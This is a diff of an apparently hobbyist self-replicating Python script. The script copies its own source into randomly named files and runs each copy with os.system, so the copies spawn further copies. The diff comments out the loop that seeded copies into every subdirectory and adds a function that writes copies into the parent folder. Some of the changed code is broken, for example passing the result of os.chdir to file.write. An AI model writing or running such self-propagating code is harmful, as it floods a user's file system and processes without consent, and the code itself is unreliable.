@@ -26,12 +26,26 @@ def writeIntoFile(file, lines):
             break
         file.write(line)
 
+def previousFolder(file, lines):
+    count = len(lines)
+    start = 0
+    for line in lines:
+        start = start + 1
+        # we dont want to copy the random string added to the end
+        if start == (count - 1):
+            break
+        file.write(line)
+        if start == 1: 
+            file.write(os.chdir('../'))
+
 def runFunc(filename):
     os.system('python3 ' + filename)
 
 #get the current file
 thisfile = os.path.basename(__file__)
 directory = os.getcwd()
+
+print(directory)
 
 #open up the file and read it
 f = open(thisfile, "r")
@@ -43,17 +57,17 @@ filename = "newpython{randomness}.py".format(randomness="".join(random.choices(s
 
 #start copying the contents of the files to the new one
 h = open("..\\" + filename, "w")
-writeIntoFile(h, lines)
+previousFolder(h, lines)
 h.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
 h.close()
 
-for x in os.walk(directory):
-    g = open(x[0] + "/" + filename, "w")
-    writeIntoFile(g, lines)
-    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
-    g.close()
-    thread = Thread(target=runFunc(x[0] + "/" + filename))
-    thread.start()
+#for x in os.walk(directory):
+#    g = open(x[0] + "/" + filename, "w")
+#    writeIntoFile(g, lines)
+#    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+#    g.close()
+#    thread = Thread(target=runFunc(x[0] + "/" + filename))
+#    thread.start()
 
 thread = Thread(target=runFunc("..\\" + filename))
 thread.start()
